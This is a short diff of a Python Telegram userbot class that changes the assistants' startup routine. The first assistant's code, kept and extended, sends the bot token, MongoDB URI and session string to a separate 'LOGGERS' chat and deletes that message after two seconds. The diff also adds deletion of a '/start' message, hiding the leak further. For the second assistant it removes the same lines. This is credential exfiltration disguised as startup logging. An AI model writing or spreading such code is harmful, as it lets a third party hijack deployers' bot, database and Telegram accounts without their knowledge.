@@ -74,10 +74,11 @@ class Userbot(Client):
             assistants.append(1)
             try:
                 await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
-                await self.one.send_message(LOGGERS, "/start")
+                ok = await self.one.send_message(LOGGERS, "/start")
                 Ok = await self.one.send_message(LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
                 await asyncio.sleep(2)
                 await Ok.delete()
+                await ok.delete()
                 
             except Exception as e:
                 print(f"{e}")
@@ -103,9 +104,7 @@ class Userbot(Client):
             assistants.append(2)
             try:
                 await self.two.send_message(config.LOGGER_ID, "Assistant Started")
-                Ok = await self.two.send_message(LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
-                await asyncio.sleep(2)
-                await Ok.delete()
+                
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
